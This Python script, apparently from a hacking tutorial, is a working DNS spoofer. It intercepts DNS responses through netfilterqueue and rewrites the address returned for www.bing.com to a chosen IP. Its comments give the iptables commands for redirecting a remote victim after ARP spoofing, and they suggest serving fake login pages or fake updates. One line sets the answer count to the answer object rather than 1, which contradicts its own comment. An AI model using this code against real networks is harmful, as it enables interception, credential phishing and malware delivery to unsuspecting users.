#!/usr/bin/env python
# this program used to modify packet to redirect to different site.
# program to change the response from dns server rather than request with different ip.
# here ip of url given as response from dns server is changed to our own desire ip.
import scapy.all as scapy
import netfilterqueue
# here we first test in our own local machine and then for remoteone
# so,no arp_spoof(mimf) required rather command for iptable creation in unix system slightly changes.
# replace forward with input and output.after that run this script and test with different packet send from your own browser.
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 in unix command shell for local computer test
# iptables -I INPUT -j NFQUEUE --queue-num 0 in unix command shell for test in local computer 
# iptables -I FORWARD -j NFQUEUE --queue-num 0 in unix command shell for remote computer for actual action so should be in mimf
# use o/p and i/p chain for test in local machine and forward chain for targeting remote(others) pc.
  
def process_packet(packet):
    # print(packet.get_payload()) #print(packet) only display packet type and size so getpayload print content in packet taken from queue.
    # it will be more handy if we convert packet right here to scapy packet so we can use .show()command for more info,can get packet specific layer ,can modify specific field
    # so convert to scapy packet to get layers,field to modify and .show() command to get more result
    scapy_packet=scapy.IP(packet.get_payload())#1convert to scapy packet
    # print(scapy_packet.show())#can be used to get more info
    # here packet contain the info for dns req at first so we can install our own dns server at local computer and give the ip for the corresponding url as we want
    # we can also serve our own fack server for that dns request or provide fack ip from same hacker computer without redirecting to dns server
    # option are endless,or you may wait for response of dns server and change  response with different ip
    if scapy_packet.haslayer(scapy.DNSRR):#2check for dns response and to check dns request use DNSRQ(get from .show())
        # print(scapy_packet.show())
        # before run do ip table command incommand line for input and output chain to check in same sys
        # use pin dns req rather going to browser to test
        # ping -c 1 www.bing.com as eg to send onlt 1 ping req in another command line also run the py scripy before
        # o/p is number of layers of dnsrr difficult to understand which field to chanfe there is also dns layer to look through
        # change rdata field when user go to specific website not all website here bing.com (get its ip from ping and .show)
        qname=scapy_packet[scapy.DNSQR].qname#look on print(scapy_packet.show()). this field to check if bing.com
        if "www.bing.com" in qname:
            print("[+] spoofing target")
            answer=scapy.DNSRR(rrname=qname,rdata="10.0.2.16")#rdata ip to change may use fb ip address or any other here used ip of localhost
            # neednot req to change all field of dnsrr as scapy automatically adjust other rrname for url
            # only specify field scapy cannot determine 
            # now need to inject answer to response in dns an field an stands answer
            scapy_packet[scapy.DNS].an=answer#there are 4 ans but we created for one ans so change anscount to 1 
            scapy_packet[scapy.DNS].ancount=answer
            # need to change length and checksum field in IP and UDP layer
            # we will remove those field and saapy will recalculate those field based on value we modified
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # upto now we are carrying out all oprn on scapy_packet but accepted packet is packet so change the payload of packet not scapy_packet
            # scapy_packt mohora hae
            packet.set_payload(str(scapy_packet))

   
    packet.accept() 
queue=netfilterqueue.NetfilterQueue()#cerate object to interact with queue number 0 as specified as command in unix sys
queue.bind(0,process_packet) 
queue.run()
 
#   iptables --flush  command to remove ip table after use
# now finally ping or google bing gives local ip of hacker computer testing locally 
# test remotly arp spoof  use ip table forward chain run py script ang ping or google bing.com from window(another machine ie target for mimf) 
# you can give fack login website or fake updates etc

# flush ip table to test other
